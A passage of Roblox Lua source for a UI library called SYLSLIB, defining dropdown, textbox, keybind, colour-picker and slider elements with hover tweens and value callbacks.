                        gradientRemoveTween:Play()
                    end)
        
        
                        UICorner_13.CornerRadius = UDim.new(0, 7)
                        UICorner_13.Parent = TextButton
        
                        TextButton.MouseButton1Click:connect(
                            function()
                                callback(TextButton.Text)
                                Option.Text = v
                                DropdownContainer:TweenSize(UDim2.new(0, 385, 0, 0))
                                wait(1)
                                DropdownContainer.Visible = false
                                dropped = false
                            end
                        )
                    end
                end
                return Dropdownfunctions
                end
    
                function SYLSLIB:NewTextbox(TBname, callback)
                    callback = callback or function()
                        end
                        local TextBux = Instance.new("Frame")
                        local Textboxname = Instance.new("TextLabel")
                        local TextBox = Instance.new("TextBox")
                        local UICorner_9 = Instance.new("UICorner")
                        local ImageLabel = Instance.new("ImageLabel")
    
                    TextBux.Name = TBname
                    TextBux.Parent = SectionInners
                    TextBux.BackgroundColor3 = Color3.fromRGB(COLORTABLE.Elements[1],COLORTABLE.Elements[2],COLORTABLE.Elements[3])
                    TextBux.BorderColor3 = Color3.fromRGB(0, 44, 65)
                    TextBux.Position = UDim2.new(0.0195652172, 0, 0, 0)
                    TextBux.Size = UDim2.new(0, 221, 0, 28)
                    TextBux.BorderSizePixel = 0
    
                    local btn = TextBux
                    local uiGradient = Instance.new("UIGradient")
        
                    uiGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(209, 240, 255)), ColorSequenceKeypoint.new(0.00, Color3.fromRGB(209, 240, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 179, 255))}
                    uiGradient.Offset = Vector2.new(-2, 0)
                    uiGradient.Rotation = 200
                    uiGradient.Parent = btn
                    
                    local isHovering = false
                    
                    local tweenService = game:GetService("TweenService")
                    local tweenInfo = TweenInfo.new(0.4, Enum.EasingStyle.Quint, Enum.EasingDirection.InOut)
                    
                    local gradientRemoveTween = tweenService:Create(uiGradient, tweenInfo, {Offset = Vector2.new(-2, 0)})
                    local gradientRestoreTween = tweenService:Create(uiGradient, tweenInfo, {Offset = Vector2.new(-0.3, 0)})
        
                    btn.MouseEnter:Connect(function()
            
                        isHovering = true
                        
                        gradientRestoreTween:Play()
                    end)
                    
                    btn.MouseLeave:Connect(function()
                        
                        isHovering = false
                        
                        gradientRemoveTween:Play()
                    end)
    
                    Textboxname.Name = "Textboxname"
    Textboxname.Parent = TextBux
    Textboxname.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Textboxname.BackgroundTransparency = 1.000
    Textboxname.Position = UDim2.new(0.152557299, 0, 0.162026539, 0)
    Textboxname.Size = UDim2.new(0, 77, 0, 20)
    Textboxname.Font = Enum.Font.Gotham
    Textboxname.Text = TBname
    Textboxname.TextColor3 = Color3.fromRGB(COLORTABLE.ElementsTextColour[1],COLORTABLE.ElementsTextColour[2],COLORTABLE.ElementsTextColour[3])
    Textboxname.TextSize = 13.000
    Textboxname.TextWrapped = true
    Textboxname.TextXAlignment = Enum.TextXAlignment.Left
    
    TextBox.Parent = TextBux
    TextBox.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
    TextBox.BorderColor3 = Color3.fromRGB(19, 19, 19)
    TextBox.Position = UDim2.new(0.514928758, 0, 0.162026539, 0)
    TextBox.Size = UDim2.new(0, 103, 0, 20)
    TextBox.Font = Enum.Font.Gotham
    TextBox.PlaceholderColor3 = Color3.fromRGB(235, 235, 235)
    TextBox.PlaceholderText = "Text Here (press enter if done)"
    TextBox.Text = ""
    TextBox.TextColor3 = Color3.fromRGB(235, 235, 235)
    TextBox.TextScaled = true
    TextBox.TextSize = 6.000
    TextBox.TextWrapped = true
    
    UICorner_9.CornerRadius = UDim.new(0, 6)
    UICorner_9.Parent = TextBox
    
    ImageLabel.Parent = TextBux
    ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    ImageLabel.BackgroundTransparency = 1.000
    ImageLabel.BorderColor3 = Color3.fromRGB(27, 42, 53)
    ImageLabel.Position = UDim2.new(0.0280509014, 0, 0.216081887, 0)
    ImageLabel.Size = UDim2.new(0, 18, 0, 18)
    ImageLabel.Image = "rbxassetid://3926305904"
    ImageLabel.ImageColor3 = Color3.fromRGB(COLORTABLE.ElementsIconColour[1],COLORTABLE.ElementsIconColour[2],COLORTABLE.ElementsIconColour[3])
    ImageLabel.ImageRectOffset = Vector2.new(324, 604)
    ImageLabel.ImageRectSize = Vector2.new(36, 36)
    
                    TextBox.FocusLost:Connect(
                        function(EnterPressed)
                            callback(TextBox.Text)
                            wait(0.18)
                            TextBox.Text = ""
                        end
                    )
                end
                function SYLSLIB:NewKeybind(KeyBindName, KeyBind, callback)
                    callback = callback or function()
                        end
                    local KeyBind = Instance.new("TextButton")
                    local UICorner_12 = Instance.new("UICorner")
                    local ImageLabel_4 = Instance.new("ImageLabel")
                    local Name = Instance.new("TextLabel")
                    local Keybindtxt = Instance.new("TextLabel")
                    local UICorner_13 = Instance.new("UICorner")
                    local current_keybind = KeyBind
    
                    KeyBind.Name = KeyBindName
                    KeyBind.Parent = SectionInners
                    KeyBind.BackgroundColor3 = Color3.fromRGB(COLORTABLE.Elements[1],COLORTABLE.Elements[2],COLORTABLE.Elements[3])
                    KeyBind.BorderColor3 = Color3.fromRGB(0, 44, 65)
                    KeyBind.Position = UDim2.new(0.167186558, 0, 0.307984799, 0)
                    KeyBind.Size = UDim2.new(0, 221, 0, 28)
                    KeyBind.Font = Enum.Font.Gotham
                    KeyBind.Text = ""
                    KeyBind.TextColor3 = Color3.fromRGB(235, 235, 235)
                    KeyBind.TextScaled = true
                    KeyBind.TextSize = 22.000
                    KeyBind.TextWrapped = true
    
                    local btn = KeyBind
                    local uiGradient = Instance.new("UIGradient")
        
                    uiGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(209, 240, 255)), ColorSequenceKeypoint.new(0.00, Color3.fromRGB(209, 240, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 179, 255))}
                    uiGradient.Offset = Vector2.new(-2, 0)
                    uiGradient.Rotation = 200
                    uiGradient.Parent = btn
                    
                    local isHovering = false
                    
                    local tweenService = game:GetService("TweenService")
                    local tweenInfo = TweenInfo.new(0.4, Enum.EasingStyle.Quint, Enum.EasingDirection.InOut)
                    
                    local gradientRemoveTween = tweenService:Create(uiGradient, tweenInfo, {Offset = Vector2.new(-2, 0)})
                    local gradientRestoreTween = tweenService:Create(uiGradient, tweenInfo, {Offset = Vector2.new(-0.3, 0)})
        
                    btn.MouseEnter:Connect(function()
            
                        isHovering = true
                        
                        gradientRestoreTween:Play()
                    end)
                    
                    btn.MouseLeave:Connect(function()
                        
                        isHovering = false
                        
                        gradientRemoveTween:Play()
                    end)
    
                    UICorner_12.CornerRadius = UDim.new(0, 4)
    UICorner_12.Parent = KeyBind
    
    ImageLabel_4.Parent = KeyBind
    ImageLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    ImageLabel_4.BackgroundTransparency = 1.000
    ImageLabel_4.Position = UDim2.new(0.0280000009, 0, 0.216000006, 0)
    ImageLabel_4.Size = UDim2.new(0, 18, 0, 18)
    ImageLabel_4.Image = "rbxassetid://3926305904"
    ImageLabel_4.ImageRectOffset = Vector2.new(364, 284)
    ImageLabel_4.ImageColor3 = Color3.fromRGB(COLORTABLE.ElementsIconColour[1],COLORTABLE.ElementsIconColour[2],COLORTABLE.ElementsIconColour[3])
    ImageLabel_4.ImageRectSize = Vector2.new(36, 36)
    
    Name.Name = "Name"
    Name.Parent = KeyBind
    Name.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Name.BackgroundTransparency = 1.000
    Name.Position = UDim2.new(0.12982592, 0, 0.178571433, 0)
    Name.Size = UDim2.new(0, 144, 0, 20)
    Name.Font = Enum.Font.Gotham
    Name.Text = KeyBindName
    Name.TextColor3 = Color3.fromRGB(COLORTABLE.ElementsTextColour[1],COLORTABLE.ElementsTextColour[2],COLORTABLE.ElementsTextColour[3])
    Name.TextSize = 15.000
    Name.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
    Name.TextScaled = true
    Name.TextXAlignment = Enum.TextXAlignment.Left
    
    Keybindtxt.Name = "Keybindtxt"
    Keybindtxt.Parent = KeyBind
    Keybindtxt.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
    Keybindtxt.BorderColor3 = Color3.fromRGB(19, 19, 19)
    Keybindtxt.Position = UDim2.new(0.786069691, 0, 0.166824833, 0)
    Keybindtxt.Size = UDim2.new(0, 45, 0, 20)
    Keybindtxt.Font = Enum.Font.GothamMedium
    Keybindtxt.Text = ". . ."
    Keybindtxt.TextColor3 = Color3.fromRGB(235, 235, 235)
    Keybindtxt.TextSize = 13.000
    Keybindtxt.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
    
    UICorner_13.CornerRadius = UDim.new(0, 4)
    UICorner_13.Parent = Keybindtxt
    
                    KeyBind.MouseButton1Click:connect(
                        function()
                            Keybindtxt.Text = ". . ."
                            local a, b = game:GetService("UserInputService").InputBegan:wait()
                            if a.KeyCode.Name ~= "Unknown" then
                                Keybindtxt.Text = a.KeyCode.Name
                                current_keybind = a.KeyCode.Name
                            end
                        end
                    )
    
                    game:GetService("UserInputService").InputBegan:connect(
                        function(current, ok)
                            if not ok then
                                if current.KeyCode.Name == current_keybind then
                                    callback()
                                end
                            end
                        end
                    )
                end

                function SYLSLIB:NewColorPicker(name, callback)
                callback = callback or function()
                    
                end

local Colour = Instance.new("TextButton")
local title = Instance.new("TextLabel")
local indicator = Instance.new("Frame")
local corner = Instance.new("UICorner")
local rgb = Instance.new("TextLabel")
local UICorner = Instance.new("UICorner")
local ImageLabel = Instance.new("ImageLabel")
local colourdrop = Instance.new("Frame")
local corner_2 = Instance.new("UICorner")
local container = Instance.new("Frame")
local corner_3 = Instance.new("UICorner")
local ColourWheel = Instance.new("ImageButton")
local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
local Picker = Instance.new("ImageLabel")
local DarknessPicker = Instance.new("ImageButton")
local UIGradient = Instance.new("UIGradient")
local Slider = Instance.new("ImageLabel")
local clickblock = Instance.new("TextButton")
local colorvissbile = false

--Properties:

Colour.Name = "Colour"
Colour.Parent = SectionInners
Colour.BackgroundColor3 = Color3.fromRGB(COLORTABLE.Elements[1],COLORTABLE.Elements[2],COLORTABLE.Elements[3])
Colour.Size = UDim2.new(0, 221, 0, 22)
Colour.AutoButtonColor = false
Colour.Text = ""
Colour.MouseButton1Click:connect(function()
    if colorvissbile then
        colorvissbile = false
        colourdrop.Visible = false
    else
        colorvissbile = true
        colourdrop.Visible = true
    end
end)


title.Name = "title"
title.Parent = Colour
title.AnchorPoint = Vector2.new(0, 0.5)
title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
title.BackgroundTransparency = 1.000
title.Position = UDim2.new(0.1402715, 0, 0.5, 0)
title.Size = UDim2.new(0.511312246, 0, 1, 0)
title.Font = Enum.Font.GothamMedium
title.Text = "Colour"
title.TextColor3 = Color3.fromRGB(COLORTABLE.ElementsTextColour[1],COLORTABLE.ElementsTextColour[2],COLORTABLE.ElementsTextColour[3])
title.TextSize = 13.000
title.TextXAlignment = Enum.TextXAlignment.Left

indicator.Name = "indicator"
indicator.Parent = Colour
indicator.AnchorPoint = Vector2.new(1, 0.5)
indicator.BackgroundColor3 = Color3.fromRGB(230, 32, 237)
indicator.Position = UDim2.new(1, 0, 0.522727251, 0)
indicator.Size = UDim2.new(-0.0328681208, 75, 0.681818187, 0)

corner.CornerRadius = UDim.new(0, 3)
corner.Name = "corner"
corner.Parent = indicator

rgb.Name = "rgb"
rgb.Parent = indicator
rgb.AnchorPoint = Vector2.new(0.5, 0.5)
rgb.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
rgb.BackgroundTransparency = 1.000
rgb.Position = UDim2.new(0.5, 0, 0.5, 0)
rgb.Size = UDim2.new(1, -14, 1, 0)
rgb.Font = Enum.Font.Gotham
rgb.Text = "230, 33, 237"
rgb.TextColor3 = Color3.fromRGB(12, 12, 12)
rgb.TextSize = 11.000

UICorner.CornerRadius = UDim.new(0, 3)
UICorner.Parent = Colour

ImageLabel.Parent = Colour
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 1.000
ImageLabel.Position = UDim2.new(0.0280000009, 0, 0.216000006, -4)
ImageLabel.Size = UDim2.new(0, 18, 0, 18)
ImageLabel.Image = "rbxassetid://3926307971"
ImageLabel.ImageColor3 = Color3.fromRGB(COLORTABLE.ElementsIconColour[1],COLORTABLE.ElementsIconColour[2],COLORTABLE.ElementsIconColour[3])
ImageLabel.ImageRectOffset = Vector2.new(804, 4)
ImageLabel.ImageRectSize = Vector2.new(36, 36)

colourdrop.Name = "colourdrop"
colourdrop.Parent = SectionInners
colourdrop.AnchorPoint = Vector2.new(0.5, 0)
colourdrop.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
colourdrop.Position = UDim2.new(0.5, 0, 0.680292428, 2)
colourdrop.Size = UDim2.new(1, 0, -0.0643519908, 148)
colourdrop.ZIndex = 3
colourdrop.Visible = false

corner_2.CornerRadius = UDim.new(0, 3)
corner_2.Name = "corner"
corner_2.Parent = colourdrop

container.Name = "container"
container.Parent = colourdrop
container.AnchorPoint = Vector2.new(0.5, 0.5)
container.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
container.Position = UDim2.new(0.5, 0, 0.5, 0)
container.Size = UDim2.new(1, -4, 1, -4)
container.ZIndex = 3

corner_3.CornerRadius = UDim.new(0, 3)
corner_3.Name = "corner"
corner_3.Parent = container



ColourWheel.Name = "ColourWheel"
ColourWheel.Parent = container
ColourWheel.Active = false
ColourWheel.AnchorPoint = Vector2.new(0.5, 0.5)
ColourWheel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ColourWheel.BackgroundTransparency = 1.000
ColourWheel.BorderSizePixel = 0
ColourWheel.Position = UDim2.new(0.309100389, 0, 0.512530446, 0)
ColourWheel.Selectable = false
ColourWheel.Size = UDim2.new(0.434449941, 0, 0.86922574, 0)
ColourWheel.Image = "http://www.roblox.com/asset/?id=6020299385"

UIAspectRatioConstraint.Parent = ColourWheel
UIAspectRatioConstraint.AspectRatio = 1.000

Picker.Name = "Picker"
Picker.Parent = ColourWheel
Picker.AnchorPoint = Vector2.new(0.5, 0.5)
Picker.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Picker.BackgroundTransparency = 1.000
Picker.BorderSizePixel = 0
Picker.Position = UDim2.new(0.5, 0, 0.5, 0)
Picker.Size = UDim2.new(0.0900257826, 0, 0.0900257975, 0)
Picker.Image = "http://www.roblox.com/asset/?id=3678860011"

DarknessPicker.Name = "DarknessPicker"
DarknessPicker.Parent = container
DarknessPicker.Active = false
DarknessPicker.AnchorPoint = Vector2.new(0.5, 0.5)
DarknessPicker.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
DarknessPicker.BackgroundTransparency = 1.000
DarknessPicker.BorderSizePixel = 0
DarknessPicker.Position = UDim2.new(0.657959282, 0, 0.503847122, 0)
DarknessPicker.Selectable = false
DarknessPicker.Size = UDim2.new(0.062522307, 0, 0.887292862, 0)
DarknessPicker.ZIndex = 2
DarknessPicker.Image = "rbxassetid://3570695787"
DarknessPicker.ScaleType = Enum.ScaleType.Slice
DarknessPicker.SliceCenter = Rect.new(100, 100, 100, 100)
DarknessPicker.SliceScale = 0.120

UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 0, 0))}
UIGradient.Rotation = 90
UIGradient.Parent = DarknessPicker

Slider.Name = "Slider"
Slider.Parent = DarknessPicker
Slider.AnchorPoint = Vector2.new(0.5, 0.5)
Slider.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Slider.BackgroundTransparency = 1.000
Slider.BorderSizePixel = 0
Slider.Position = UDim2.new(0.491197795, 0, 0.0733607039, 0)
Slider.Size = UDim2.new(1.28656352, 0, 0.0265010502, 0)
Slider.ZIndex = 2
Slider.Image = "rbxassetid://3570695787"
Slider.ImageColor3 = Color3.fromRGB(255, 74, 74)
Slider.ScaleType = Enum.ScaleType.Slice
Slider.SliceCenter = Rect.new(100, 100, 100, 100)
Slider.SliceScale = 0.120

clickblock.Name = "clickblock"
clickblock.Parent = colourdrop
clickblock.AnchorPoint = Vector2.new(0.5, 0.5)
clickblock.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
clickblock.BackgroundTransparency = 1.000
clickblock.Position = UDim2.new(0.5, 0, 0.5, 0)
clickblock.Size = UDim2.new(1, 0, 1, 0)
clickblock.ZIndex = 2
clickblock.Font = Enum.Font.SourceSans
clickblock.Text = ""
clickblock.TextColor3 = Color3.fromRGB(0, 0, 0)
clickblock.TextSize = 14.000

local colourWheel = ColourWheel
local wheelPicker = Picker

local darknessPicker = DarknessPicker
local darknessSlider = Slider

local colourDisplay = indicator


local uis = game:GetService("UserInputService")


local buttonDown = false
local movingSlider = false


local function updateColour(centreOfWheel)
	
	
	local colourPickerCentre = Vector2.new(
		Picker.AbsolutePosition.X + (Picker.AbsoluteSize.X/2),
		Picker.AbsolutePosition.Y + (Picker.AbsoluteSize.Y/2)
	)
	local h = (math.pi - math.atan2(colourPickerCentre.Y - centreOfWheel.Y, colourPickerCentre.X - centreOfWheel.X)) / (math.pi * 2)
	
	local s = (centreOfWheel - colourPickerCentre).Magnitude / (colourWheel.AbsoluteSize.X/2)
	
	local v = math.abs((darknessSlider.AbsolutePosition.Y - darknessPicker.AbsolutePosition.Y) / darknessPicker.AbsoluteSize.Y - 1)
	
	
	local hsv = Color3.fromHSV(math.clamp(h, 0, 1), math.clamp(s, 0, 1), math.clamp(v, 0, 1))
	

	colourDisplay.BackgroundColor3 = hsv
	local colors = hsv -- or any random HSV color
-- multiply the components by 255 and get the nearest number
local r,g,b = math.floor((colors.R*255)+0.5),math.floor((colors.G*255)+0.5),math.floor((colors.B*255)+0.5)
	rgb.Text = r..", "..g..", "..b
	callback(r..", "..g..", "..b)
	UIGradient.Color = ColorSequence.new{
		ColorSequenceKeypoint.new(0, hsv), 
		ColorSequenceKeypoint.new(1, Color3.new(0, 0, 0))
	}
end


colourWheel.MouseButton1Down:Connect(function()
	buttonDown = true
end)

darknessPicker.MouseButton1Down:Connect(function()
	movingSlider = true
end)


uis.InputEnded:Connect(function(input)
	
	if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
	
	buttonDown = false
	movingSlider = false
end)


uis.InputChanged:Connect(function(input)
	
	if input.UserInputType ~= Enum.UserInputType.MouseMovement then return end
	
	
	local mousePos = uis:GetMouseLocation() - Vector2.new(0, game:GetService("GuiService"):GetGuiInset().Y)
	
	local centreOfWheel = Vector2.new(colourWheel.AbsolutePosition.X + (colourWheel.AbsoluteSize.X/2), colourWheel.AbsolutePosition.Y + (colourWheel.AbsoluteSize.Y/2))
	
	local distanceFromWheel = (mousePos - centreOfWheel).Magnitude
	
	
	if distanceFromWheel <= colourWheel.AbsoluteSize.X/2 and buttonDown then
		
		wheelPicker.Position = UDim2.new(0, mousePos.X - colourWheel.AbsolutePosition.X, 0, mousePos.Y - colourWheel.AbsolutePosition.Y)

		
	elseif movingSlider then
		
		darknessSlider.Position = UDim2.new(darknessSlider.Position.X.Scale, 0, 0, 
			math.clamp(
			mousePos.Y - darknessPicker.AbsolutePosition.Y, 
			0, 
			darknessPicker.AbsoluteSize.Y)
		)	
	end
	
	
	updateColour(centreOfWheel)
end)



                end

                function SYLSLIB:NewSlider(slidInf, maxvalue, minvalue, callback)
                    slidInf = slidInf or "Slider"
                    maxvalue = maxvalue or 500
                    minvalue = minvalue or 16
                    startVal = startVal or 0
                    callback = callback or function()
                        end
    
                   local Slider = Instance.new("Frame")
                        local SliderButton = Instance.new("TextButton")
                        local SliderName = Instance.new("TextLabel")
                        local UICorner = Instance.new("UICorner")
                        local inside = Instance.new("Frame")
                        local corner = Instance.new("UICorner")
                        local indicator = Instance.new("Frame")
                        local UICorner_9 = Instance.new("UICorner")
                        local UICorner_10 = Instance.new("UICorner")
                        local Number = Instance.new("TextLabel")
                        local mouse = game.Players.LocalPlayer:GetMouse()
                        local uis = game:GetService("UserInputService")
                        local Value
        
                        Slider.Name = slidInf
        Slider.Parent = SectionInners
        Slider.BackgroundColor3 = Color3.fromRGB(COLORTABLE.Elements)
        Slider.BorderColor3 = Color3.fromRGB(0, 44, 65)
        Slider.Position = UDim2.new(0, 0, 0.0283400808, 0)
        Slider.Size = UDim2.new(0, 221, 0, 28)

        UICorner_9.CornerRadius = UDim.new(0, 3)
        UICorner_9.Parent = Slider

        local btn = Slider
        local uiGradient = Instance.new("UIGradient")
        
        uiGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(209, 240, 255)), ColorSequenceKeypoint.new(0.00, Color3.fromRGB(209, 240, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 179, 255))}
        uiGradient.Offset = Vector2.new(-2, 0)
        uiGradient.Rotation = 200
        uiGradient.Parent = btn
    
        SliderName.Name = "SliderName"
        SliderName.Parent = Slider
        SliderName.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        SliderName.BackgroundTransparency = 1.000
        SliderName.Position = UDim2.new(0.03, 0, 0.10, 0)
        SliderName.Size = UDim2.new(0, 352, 0, 10)
        SliderName.Font = Enum.Font.GothamMedium
        SliderName.Text = slidInf
        SliderName.TextColor3 = Color3.fromRGB(COLORTABLE.ElementsTextColour[1],COLORTABLE.ElementsTextColour[2],COLORTABLE.ElementsTextColour[3])
        SliderName.TextSize = 12.000
        SliderName.TextXAlignment = Enum.TextXAlignment.Left
    
        UICorner_10.CornerRadius = UDim.new(0, 3)
        UICorner_10.Parent = SliderName
    
        Number.Name = "Number"
        Number.Parent = Slider
        Number.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        Number.BackgroundTransparency = 1.000
        Number.Position = UDim2.new(0.875, 0, 0.10, 0)
        Number.Size = UDim2.new(0, 32, 0, 12)
        Number.Font = Enum.Font.Gotham
        Number.Text = "0"
        Number.TextColor3 = Color3.fromRGB(COLORTABLE.ElementsTextColour[1],COLORTABLE.ElementsTextColour[2],COLORTABLE.ElementsTextColour[3])
        Number.TextSize = 14.000
    
    --Properties:
    
    SliderButton.Name = "SliderButton"
    SliderButton.Parent = Slider
    SliderButton.AnchorPoint = Vector2.new(0.5, 1)
    SliderButton.BackgroundColor3 = Color3.fromRGB(42, 78, 199)
    SliderButton.Position = UDim2.new(0.497737557, 0, 0.928571403, 0)
    SliderButton.Size = UDim2.new(0.950226247, 0, -0.0357142873, 12)
    SliderButton.Font = Enum.Font.SourceSans
    SliderButton.Text = ""
    SliderButton.TextColor3 = Color3.fromRGB(0, 0, 0)
    SliderButton.TextSize = 14.000
    SliderButton.AutoButtonColor = false
    
    UICorner.CornerRadius = UDim.new(0, 3)
    UICorner.Parent = SliderButton
    
    inside.Name = "inside"
    inside.Parent = SliderButton
    inside.AnchorPoint = Vector2.new(0.5, 0.5)
    inside.BackgroundColor3 = Color3.fromRGB(12,12,12)
    inside.Position = UDim2.new(0.5, 0, 0.458335876, 0)
    inside.Size = UDim2.new(1, -2, 0.930555522, -2)
    
    corner.CornerRadius = UDim.new(0, 3)
    corner.Name = "corner"
    corner.Parent = inside
    
    indicator.Name = "indicator"
    indicator.Parent = inside
    indicator.AnchorPoint = Vector2.new(0, 0.5)
    indicator.BackgroundColor3 = Color3.fromRGB(COLORTABLE.Elements)
    indicator.BorderSizePixel = 0
    indicator.Position = UDim2.new(0, 0, 0.499998391, 0)
    indicator.Size = UDim2.new(0.00367267313, 0, 1, 0)
    
    
                    SliderButton.MouseButton1Down:Connect(
                        function()
                            Value =
                                math.floor(
                                (((tonumber(maxvalue) - tonumber(minvalue)) / 208) * indicator.AbsoluteSize.X) +
                                    tonumber(minvalue)
                            ) or 0
                            pcall(
                                function()
                                    callback(Value)
                                end
                            )
                            indicator.Size =
                                UDim2.new(0, math.clamp(mouse.X - indicator.AbsolutePosition.X, 0, 208), 0, 10)
                            moveconnection =
                                mouse.Move:Connect(
                                function()
                                    Number.Text = Value
                                    Value =
                                        math.floor(
                                        (((tonumber(maxvalue) - tonumber(minvalue)) / 208) * indicator.AbsoluteSize.X) +
                                            tonumber(minvalue)
                                    )
                                    pcall(
                                        function()
                                            callback(Value)
                                        end
                                    )
                                    indicator.Size =
                                        UDim2.new(0, math.clamp(mouse.X - indicator.AbsolutePosition.X, 0, 208), 0, 10)
                                end
                            )
                            releaseconnection =
                                uis.InputEnded:Connect(
                                function(Mouse)
                                    if Mouse.UserInputType == Enum.UserInputType.MouseButton1 then
                                        Value =
                                            math.floor(
                                            (((tonumber(maxvalue) - tonumber(minvalue)) / 208) * indicator.AbsoluteSize.X) +
                                                tonumber(minvalue)
                                        )
                                        pcall(
                                            function()
                                                callback(Value)
                                            end
                                        )
                                        indicator.Size =
                                            UDim2.new(
                                            0,
                                            math.clamp(mouse.X - indicator.AbsolutePosition.X, 0, 208),
                                            0,
                                            10
                                        )
                                        moveconnection:Disconnect()
                                        releaseconnection:Disconnect()
                                    end
                                end
                            )
                        end
                    )
    
        end
        TabsContainer.CanvasPosition = Vector2.new(100000, 0)
        print(TabsContainer.CanvasPosition / 3)
        TabsContainer.CanvasPosition = TabsContainer.CanvasPosition / 3
        for i, v in next, Containers:GetChildren() do
            if i == 1 then
            v.Visible = true
            else
            v.Visible = false
            end
        end
        
        return SYLSLIB
    end
    return sectionelements
    end
        return Elements
    end

return LIB
